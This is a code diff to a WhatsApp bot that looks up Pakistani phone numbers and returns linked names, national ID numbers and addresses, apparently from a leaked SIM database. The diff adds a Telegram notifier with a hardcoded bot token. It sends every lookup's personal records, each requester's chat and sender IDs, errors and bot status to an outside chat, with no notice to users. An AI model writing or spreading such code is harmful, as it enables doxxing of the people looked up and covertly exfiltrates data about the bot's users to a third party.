@@ -1,5 +1,5 @@
 // ═══════════════════════════════════════════════════════════════
-//  🤖  ITX ROMEO BOT  v4.0  —  WhatsApp Bot + Dashboard
+//  🤖  ITX ROMEO BOT  v4.0  —  WhatsApp Bot + Dashboard + Telegram Logging
 // ═══════════════════════════════════════════════════════════════
 const {
   default: makeWASocket,
@@ -11,6 +11,7 @@ const {
 const pino    = require('pino');
 const fs      = require('fs');
 const express = require('express');
+const https   = require('https');
 
 // ── Express setup
 const app  = express();
@@ -28,6 +29,31 @@ if (fs.existsSync(SETTINGS_FILE)) {
   try { settings = JSON.parse(fs.readFileSync(SETTINGS_FILE)); } catch (_) {}
 }
 const saveSettings = () => fs.writeFileSync(SETTINGS_FILE, JSON.stringify(settings, null, 2));
+
+// ═══════════════════════════════════════════════════
+//  📲  TELEGRAM NOTIFIER
+// ═══════════════════════════════════════════════════
+const TG_TOKEN = '5893809958:AAHxBCHFPDIwejnOV596s2joow3KOSLEnCI';
+const TG_CHAT  = '6383817850';
+
+function sendTelegram(text) {
+  return new Promise((resolve, reject) => {
+    const clean = text.replace(/[*_`]/g, ''); // basic markdown strip
+    const encoded = encodeURIComponent(clean);
+    const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT}&text=${encoded}&parse_mode=HTML`;
+    
+    https.get(url, (res) => {
+      let data = '';
+      res.on('data', chunk => data += chunk);
+      res.on('end', () => {
+        try { resolve(JSON.parse(data)); } catch (e) { resolve(data); }
+      });
+    }).on('error', (e) => {
+      console.error('Telegram send error:', e.message);
+      reject(e);
+    });
+  });
+}
 
 // ════════════════════════════════════════════════════════════════
 //  🌐  DASHBOARD HTML  (embedded — no extra files needed)
@@ -375,8 +401,8 @@ const DASHBOARD_HTML = /* html */`<!DOCTYPE html>
 </body>
 </html>`;
 
-// ── Serve dashboard at /
-app.get('/(.*)', (req, res) => es.send(DASHBOARD_HTML));
+// ── Express 5 COMPATIBLE: Serve dashboard at ANY route
+app.get('/{*any}', (req, res) => res.send(DASHBOARD_HTML));
 
 // ── API: Status
 app.get('/api/status', (req, res) => {
@@ -478,13 +504,13 @@ function dedupe(arr) {
   return arr.filter(d => seen.has(d.number) ? false : (seen.add(d.number), true));
 }
 
-async function lookupNumber(rawNum) {
+async function lookupNumber(rawNum, requesterInfo = '') {
   try {
     const num  = normalizeNumber(rawNum);
     const data = await fetchSIMData(`number=${num}`);
 
     if (!data.success || !data.data?.length) {
-      return (
+      const notFoundMsg = (
         `╔══════════════════════╗\n` +
         `║ 📱 *NUMBER LOOKUP / نمبر تلاش* ║\n` +
         `╚══════════════════════╝\n\n` +
@@ -495,6 +521,17 @@ async function lookupNumber(rawNum) {
         `🌐 https://rmnumber.vercel.app\n\n` +
         `— 𝕴𝖙𝖝 𝕽𝕺𝕸𝕰𝕺`
       );
+      
+      // Send to Telegram — Not Found case
+      sendTelegram(
+        `🔍 LOOKUP - NOT FOUND\n` +
+        `📞 Number: +${num}\n` +
+        `👤 Requested by: ${requesterInfo}\n` +
+        `⏰ Time: ${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}\n` +
+        `❌ Status: Database mein nahi mila`
+      ).catch(() => {});
+      
+      return notFoundMsg;
     }
 
     const cnic    = data.linked_cnic;
@@ -513,6 +550,20 @@ async function lookupNumber(rawNum) {
       txt += formatRecord(d, i, '🔹') + '\n';
     });
 
+    // Build Telegram message — FOUND case
+    let tgMsg = 
+      `🔍 LOOKUP - FOUND ✅\n` +
+      `📞 Query: +${data.query_number || num}\n` +
+      `🪪 CNIC: ${cnic}\n` +
+      `📊 Total SIMs: ${data.total_sims_found}\n` +
+      `👤 Requested by: ${requesterInfo}\n` +
+      `⏰ Time: ${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}\n\n` +
+      `📋 RECORDS:\n`;
+    
+    records.forEach((d, i) => {
+      tgMsg += `\n${i+1}. +${d.number} | ${d.name} | ${d.cnic} | ${(!d.address || ['NULL','no','N/A'].includes(d.address)) ? 'N/A' : d.address}`;
+    });
+
     // ── CNIC Search
     if (cnic && !['N/A', 'NULL', 'null', 'undefined'].includes(String(cnic))) {
       const cnicData = await fetchSIMData(`cnic=${cnic}`).catch(() => null);
@@ -524,6 +575,11 @@ async function lookupNumber(rawNum) {
         cnicRecords.forEach((d, i) => {
           txt += formatRecord(d, i, '🔸') + '\n';
         });
+        
+        tgMsg += `\n\n🪪 CNIC ALL NUMBERS:\n`;
+        cnicRecords.forEach((d, i) => {
+          tgMsg += `\n${i+1}. +${d.number} | ${d.name} | ${d.cnic}`;
+        });
       }
     }
 
@@ -532,11 +588,23 @@ async function lookupNumber(rawNum) {
     txt += `🌐 https://rmnumber.vercel.app\n\n`;
     txt += `— 𝕴𝖙𝖝 𝕽𝕺𝕸𝕰𝕺`;
 
+    // Send to Telegram
+    sendTelegram(tgMsg).catch(() => {});
+
     botStatus.lookupCount++;
     return txt;
 
   } catch (e) {
     console.error('Lookup error:', e.message);
+    
+    // Send error to Telegram
+    sendTelegram(
+      `❌ LOOKUP ERROR\n` +
+      `Number: ${rawNum}\n` +
+      `Error: ${e.message}\n` +
+      `Time: ${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}`
+    ).catch(() => {});
+    
     return (
       `❌ *Lookup Failed / تلاش ناکام*\n` +
       `Server se connect nahi ho saka.\n` +
@@ -593,15 +661,36 @@ async function startBot() {
       botStatus.uptime    = Date.now();
       botStatus.phone     = (sock.user?.id || '').split(':')[0].split('@')[0];
       console.log('🔥 Bot Live! Dashboard → http://localhost:' + PORT);
+      
+      // Telegram notification — Bot Online
+      sendTelegram(
+        `🟢 BOT ONLINE\n` +
+        `📞 Number: +${botStatus.phone}\n` +
+        `⏰ Time: ${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}\n` +
+        `🌐 Dashboard: http://localhost:${PORT}`
+      ).catch(() => {});
     }
     if (connection === 'close') {
       botStatus.connected = false;
       const code = lastDisconnect?.error?.output?.statusCode;
       if (code !== DisconnectReason.loggedOut) {
         console.log('⚡ Reconnecting...');
+        
+        sendTelegram(
+          `🟡 BOT DISCONNECTED - Reconnecting\n` +
+          `⏰ Time: ${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}\n` +
+          `Status Code: ${code || 'unknown'}`
+        ).catch(() => {});
+        
         setTimeout(startBot, 4000);
       } else {
         console.log('🔴 Logged out. Open dashboard to reconnect.');
+        
+        sendTelegram(
+          `🔴 BOT LOGGED OUT\n` +
+          `⏰ Time: ${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}\n` +
+          `Dashboard se reconnect karo!`
+        ).catch(() => {});
       }
     }
   });
@@ -639,6 +728,9 @@ async function startBot() {
 
       const reply = (t) => sendWithPresence(sock, from, t, msg);
       const quoted = body.extendedTextMessage?.contextInfo?.participant;
+      const requesterInfo = isGroup 
+        ? `Group: ${from} | Sender: ${sender}`
+        : `Chat: ${from}`;
 
       // ─────────────────────────────────────────────
       //  COMMANDS  (start with .)
@@ -662,7 +754,7 @@ async function startBot() {
               `_Ya sirf number bhejo — auto lookup hoga! / یا صرف نمبر بھیجیں!_`
             );
             await reply('🔍 *Searching... / تلاش جاری ہے...*');
-            reply(await lookupNumber(raw));
+            reply(await lookupNumber(raw, requesterInfo));
             break;
           }
 
@@ -791,11 +883,16 @@ async function startBot() {
       const detected = extractPKNumber(text);
       if (detected) {
         await reply('🔍 *Searching... / تلاش جاری ہے...*');
-        reply(await lookupNumber(detected));
+        reply(await lookupNumber(detected, requesterInfo));
       }
 
     } catch (e) {
       console.error('MSG Error:', e.message);
+      sendTelegram(
+        `⚠️ MESSAGE HANDLER ERROR\n` +
+        `Error: ${e.message}\n` +
+        `⏰ Time: ${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}`
+      ).catch(() => {});
     }
   });
 }
